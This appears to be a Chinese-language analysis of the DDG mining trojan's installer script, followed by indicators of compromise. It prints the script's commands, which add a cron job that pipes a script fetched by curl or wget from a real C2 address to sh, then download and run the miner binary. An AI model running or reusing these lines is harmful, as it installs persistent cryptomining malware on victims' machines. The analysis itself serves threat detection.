## 一、DDG 木马脚本内容

黑客在通过SSH爆破或漏洞攻击入侵后，首先下载Shell脚本i.sh，并将其安装为crontab定时任务每15分钟执行一次。主要根据机器的平台架构选择对应版本的ddg二进制文件(i686和x86_64)。

```
mkdir -p /var/spool/cron/crontabs

echo "" > /var/spool/cron/root

echo "*/15 * * * * (/usr/bin/nfosfa4||/usr/libexec/nfosfa4||/usr/local/bin/nfosfa4||/tmp/nfosfa4||curl -fsSL -m180 http://68.183.140.39/i.sh||wget -q -T180 -O- http://68.183.140.39/i.sh) | sh" >> /var/spool/cron/root

cp -f /var/spool/cron/root /var/spool/cron/crontabs/root 
```

然后检测是否已经存在进程nfosfa4，若存在则杀死进程并删除对应的文件，然后从服务器下载ddgs.$(uname -m)保存为nfosfa4，其中uname –m用来获取系统类型并映射到文件名。最后通过chmod +x给nfosfa4赋予可执行权限，从而完成木马的下载更新。

```
ps auxf | grep -v grep | grep nfosfa4 || rm -rf nfosfa4

if [ ! -f "nfosfa4" ]; then

curl -fsSL -m1800 http://68.183.140.39/static/4004/ddgs.$(uname -m) -o nfosfa4||wget -q -T1800 http://68.183.140.39/static/4004/ddgs.$(uname -m) -O nfosfa4

fi

chmod +x nfosfa4 
```

接着查找并杀死多个历史版本的病毒进程，进程名分别为nfosbcb、nfosbcc、nfosbcd、nfosbce、nfosfa0、nfosfa1、nfosfa2。

```
ps auxf | grep -v grep | grep nfosbcb | awk '{print $2}' | xargs kill -9

ps auxf | grep -v grep | grep nfosbcc | awk '{print $2}' | xargs kill -9

ps auxf | grep -v grep | grep nfosbcd | awk '{print $2}' | xargs kill -9

ps auxf | grep -v grep | grep nfosbce | awk '{print $2}' | xargs kill -9

ps auxf | grep -v grep | grep nfosfa0 | awk '{print $2}' | xargs kill -9

ps auxf | grep -v grep | grep nfosfa1 | awk '{print $2}' | xargs kill -9

ps auxf | grep -v grep | grep nfosfa2 | awk '{print $2}' | xargs kill -9 
```

然后启动病毒的最新版本nfosfa4，病毒被存放于以下四个目录之一。

```
/usr/bin/nfosfa4

/usr/libexec/nfosfa4

/usr/local/bin/nfosfa4

/tmp/nfosfa4 
```

在新版本中的i.sh版本中的下载链接替换成了域名的形式，并且每次访问域名都会随机替换。下载的是DDG的go语言编译的母体文件，其主要作用有创建守护进程、创建后门、下载挖矿程序挖矿（SzdXM）、命令执行这4个功能。



### IOCs

钱包地址：8AzmXnQJ4kjNmcE4w6mwVabzhUTZ4jsaj5rmBgJosvrD7ag7TPTG2U4Kruv5Mevxp2BE8K6n9YJGfeLYZzkCDUdNGHT8sUy

C2：68.183.140.39

### URI：

> http://103.219.112.66:8000/slave
>
> http://68.183.140.39:8000/static/4004/ddgs.i686
>
> http://68.183.140.39:8000/static/4004/ddgs.x86_64
>
> http://68.183.140.39:8000/static/SzdXM

### MD5:

> ddgs.x86_64 : BDFA1C43B3E03880D718609AF3B9648F
>
> ddgs.i686 : 76309D50AD8412954CA87355274BD8FF
>
> SzdXM :F24E35D722150B5E2E70F316734D88F